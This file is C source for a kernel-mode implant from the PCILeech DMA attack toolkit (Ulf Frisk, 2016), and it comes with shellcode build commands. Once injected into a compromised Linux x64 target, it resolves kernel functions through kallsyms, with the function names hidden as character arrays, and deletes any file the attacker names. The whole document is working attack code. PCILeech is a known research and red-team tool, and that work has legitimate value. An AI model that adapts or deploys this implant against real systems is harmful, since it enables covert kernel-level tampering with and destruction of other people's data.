// lx64_filedelete.c : kernel code to delete files from target system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_filedelete.c
// ml64 lx64_common_a.asm /Felx64_filedelete.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_filedelete.obj lx64_common.obj
// shellcode64.exe -o lx64_filedelete.exe "DELETE FILE ON TARGET SYSTEM                                   \nLINUX X64 EDITION                                              \n===============================================================\nDelete a specified file on the target system.                  \nREQUIRED OPTIONS:                                              \n  -s   : file on target system.                                \n         Example: '-s /tmp/file2delete'                        \n  -0   : run flag - set to non zero to delete file.            \n===== DETAILED RESULT INFORMATION =============================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n==============================================================="
// 

#include "lx64_common.h"

typedef struct tdFN2 {
    QWORD memcpy;
	QWORD sys_unlink;
} FN2, *PFN2;

typedef struct tdFN3 {
    QWORD memcpy;
    QWORD getname;
    QWORD do_unlinkat;
} FN3, *PFN3;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD NAMES[2];
    CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	CHAR str_sys_unlink[] = { 's', 'y', 's', '_', 'u', 'n', 'l', 'i', 'n', 'k', 0 };
    NAMES[0] = (QWORD)str_memcpy;
	NAMES[1] = (QWORD)str_sys_unlink;
	return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, 2);
}

BOOL LookupFunctions3(PKMDDATA pk, PFN3 pfn3)
{
    QWORD NAMES[3];
    CHAR str_memcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
    CHAR str_getname[] = { 'g', 'e', 't', 'n', 'a', 'm', 'e', 0 };
    CHAR str_do_unlinkat[] = { 'd', 'o', '_', 'u', 'n', 'l', 'i', 'n', 'k', 'a', 't', 0 };
    NAMES[0] = (QWORD)str_memcpy;
    NAMES[1] = (QWORD)str_getname;
    NAMES[2] = (QWORD)str_do_unlinkat;
    return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn3, 3);
}

#define AT_FDCWD       -100

VOID c_EntryPoint(PKMDDATA pk)
{
    BOOL f2, f3;
	FN2 fn2;
    FN3 fn3;
	QWORD qwResult;
    f2 = LookupFunctions2(pk, &fn2);
    f3 = LookupFunctions3(pk, &fn3);
	if(!f2 && !f3) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
    SysVCall((f2 ? fn2.memcpy : fn3.memcpy), pk->dataOutStr, pk->dataInStr, MAX_PATH);
    if(!pk->dataIn[0]) {
        pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
        return;
    }
    qwResult = f2 ?
        SysVCall(fn2.sys_unlink, pk->dataInStr) :
        SysVCall(fn3.do_unlinkat, AT_FDCWD, SysVCall(fn3.getname, pk->dataInStr));
	if(qwResult) {
		pk->dataOut[0] = STATUS_FAIL_ACTION;
		return;
	}
}